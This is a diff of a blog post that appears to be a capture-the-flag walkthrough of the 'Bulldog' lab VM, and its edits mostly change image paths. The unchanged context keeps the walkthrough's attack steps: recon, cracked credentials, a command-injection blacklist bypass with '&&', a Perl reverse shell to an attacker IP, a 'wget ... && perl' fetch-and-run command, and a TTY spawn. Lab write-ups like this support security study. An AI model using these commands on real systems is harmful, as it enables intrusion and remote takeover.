@@ -17,7 +17,7 @@ finished: true
 
 # Recon
 
-Conveniently the machine's IP *(in my case 192.168.0.199 )* is already displayed on the bootup screen and therefore there is no need to run a host-discovery scan. Skip straight to nmap and let's see what we get. 
+Conveniently the machine's IP *(in my case 192.168.0.199 )* is already displayed on the bootup screen and therefore there is no need to run a host-discovery scan. Skip straight to nmap:
 
 ```console
 root@EdgeOfNight:~# nmap -v -A -T5 192.168.0.199
@@ -96,11 +96,11 @@ Nmap done: 1 IP address (1 host up) scanned in 31.34 seconds
 
 SSH running on port 23? Odd. 2 web servers, one on 80 and other on 8080? Odd as well. Hopefully we can get something out of this! I launch dirb - `dirb 192.168.0.199` and proceed to manually browse the webpage for visual clues.    
 
-<img src="/img/blog/Bulldog01.png">
+<img src="/img/blog/bulldog/Bulldog01.png">
 
 Public notice displays:
 
-<img src="/img/blog/Bulldog02.png">
+<img src="/img/blog/bulldog/Bulldog02.png">
 
 There is a mention of *clam shell* and a *smelly cow* which in my opinion got mistaken for a *reverse shell* and *[dirty c0w](https://dirtycow.ninja/) kernel root exploit*. Is that an indirect hint for exploitation in this machine? We'll see. That is all I managed to manually find, even after doing some deeper crawling. Hopefully we gave dirb enough time to run and find some good information.
 
@@ -162,7 +162,7 @@ Duh... Quite a lot to go through. Let's pick some directories of interest and se
 
 **/dev/** presents us with a webpage 
 
-<img src="/img/blog/Bulldog03.png">
+<img src="/img/blog/bulldog/Bulldog03.png">
 
 which was supposed to stay hidden from public? That's a bit suspicious. I quickly reviewed the web source and couldn't believe my eyes. Take a look for yourself. 
 
@@ -203,7 +203,7 @@ Session completed
 
 All we need to find now is a way to login and use the cracked credentials. Onto the next directory **/dev/shell/**!
 
-<img src="/img/blog/Bulldog04.png">
+<img src="/img/blog/bulldog/Bulldog04.png">
 
 No cigar. We need to authenticate first. But where? Maybe we will be able to do so in */admin/* directory? 
 
@@ -211,21 +211,20 @@ No cigar. We need to authenticate first. But where? Maybe we will be able to do 
 
 Indeed we are! Let's login using `sarah:bulldoglover` or `nick:bulldog` credentials and see what we get.
 
-<img src="/img/blog/Bulldog06.png">
-[DONT INSERT IMAGE 7 HERE]
+<img src="/img/blog/bulldog/Bulldog06.png">
 
 A dead end from the interface. Not having enough privileges, I do not think we can do much. I've spent almost 20 minutes trying to see what I can do within the admin panel and only then realized my stupid mistake. Remember the **/dev/shell/** directory which required authentication before accessing it? Why won't we try again and see what it shows now?
 
-<img src="/img/blog/Bulldog08.png">
+<img src="/img/blog/bulldog/Bulldog08.png">
 
 Wooho! Possible [command injection](https://www.owasp.org/index.php/Command_Injection)? Of course! Similar vulnerability was described in my previous [Kioptrix2 blog](https://v3ded.github.io/ctf/kioptrix2.html), so there won't be any explaining here. After some digging around I noticed that `;` is blacklisted and results into this message:
 
-<img src="/img/blog/Bulldog09.png">
+<img src="/img/blog/bulldog/Bulldog09.png">
 
 Interesting... Luckily, there are many bypasses for such simple blacklist. For example using encoding (didn't work this time) or some other alternatives such as `&&` (AND operator). All in all, `&&` successfully bypasses the blacklist and gives us the ability to enter any command of our choosing. Wonderful.
 
 Proof:
-<img src="/img/blog/Bulldog10.png">
+<img src="/img/blog/bulldog/Bulldog10.png">
    
 Time to get a sweet shell. This writeup is *metesploit-free* which means we will depend on manual exploitation and reverse connection rather than using msfvenom & handler. Sorry!
 
@@ -246,7 +245,7 @@ use Socket;$i="192.168.0.213";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobynam
 
 After we launch netcat listener - `nc -lvp 1234`, download and run the perl file on victim machine using: `pwd && wget 192.168.0.213/shell.pl && perl shell.pl`. *wget* downloads the file and *perl* compiles + runs it. 
 
-<img src="/img/blog/Bulldog11.png">
+<img src="/img/blog/bulldog/Bulldog11.png">
 
 Easy! Time for some privilege escalation.
 
@@ -255,7 +254,7 @@ Easy! Time for some privilege escalation.
 # Escalating privileges from django to root
 From doing a `whoami` or `id` command we can see that our shell is running under django user with limited privileges. Escalation is needed. I checked some common directories such as **/var/html/***, **/tmp**, **/etc/**, but got no results. Not finding any system misconfigurations I shift to **/home/** where two folders are present. *Django* (ours) and *bulldogadmin*. *buldogadmin* has a hidden file in its home directory which can be seen using `ls -la` (list all). 
 
-<img src="/img/blog/Bulldog12.png">
+<img src="/img/blog/bulldog/Bulldog12.png">
 
 Luckily our django user has required read privileges for the folder which will (eventually) lead to the main compromise. Two more files are present - *customPermissionApp* and *note*. *note* is a read only file that describes purpose of the app within the directory. For the sake of simplicity I won't include it here *(It's too long.)*. Now our next file is quite an interesting one. We can't edit or execute it, however readonly permissions are assigned. To get a general idea of how the program behaves I `objdump` it and run `strings`. `strings customPermissionApp` presents us with a beautiful list, and maybe a password.
 
@@ -295,7 +294,7 @@ TTY shell command: `python -c 'import pty; pty.spawn("/bin/sh")'`
 
 After what it seemes ages, I manage to get the correct password! `SUPERultimatePASSWORDyouCANTget`. 
 
-<img src="/img/blog/Bulldog13.png">
+<img src="/img/blog/bulldog/Bulldog13.png">
 
 ***
 
